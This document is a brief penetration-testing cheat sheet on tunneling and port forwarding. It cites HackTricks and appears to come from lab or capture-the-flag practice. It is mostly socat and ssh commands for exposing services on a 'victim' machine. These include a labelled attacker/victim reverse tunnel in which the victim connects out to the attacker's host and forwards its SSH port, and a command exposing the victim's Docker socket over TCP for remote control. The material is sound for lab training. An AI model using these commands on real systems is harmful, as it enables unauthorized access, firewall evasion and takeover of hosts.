# Tunneling
[https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding) 

To find running services on the victim machine, run `ss -tulwn`

For forwarding an internal port to externel connection, 90% of what normally is needed, do this

```text-plain
./socat tcp-l:2222,fork,reuseaddr tcp:127.0.0.1:3306
```

`socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT`

If you are not familiar with `socat`, the options that we used are:

*   `-d -d` provides some debugging data (fatal, error, warning, and notice messages)
*   `OPENSSL-LISTEN:PORT_NUM` indicates that the connection will be encrypted using OPENSSL
*   `cert=PEM_FILE` provides the PEM file (certificate and private key) to establish the encrypted connection
*   `verify=0` disables checking peer’s certificate
*   `fork` creates a sub-process to handle each new connection.

For forwarding a local port use   
`socat tcp-l:2222,fork,reuseaddr tcp:10.17.17.11:22`

```text-plain
attacker> socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost 

victim> while true; do socat TCP4:10.17.17.11:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22 

attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run **ssh -L 10000:localhost:10000 <username>@<ip>**

 **ss -tulpn shows local services connected to the victim machine**  
`# on target machine`  
`# get a port to communicate with the socket file`  
`socat tcp-l:3275,fork,reuseaddr unix-connect:/var/run/docker.sock &!`  
  
  
`# on your system`  
`# use docker`  
`docker -H :3275 ...`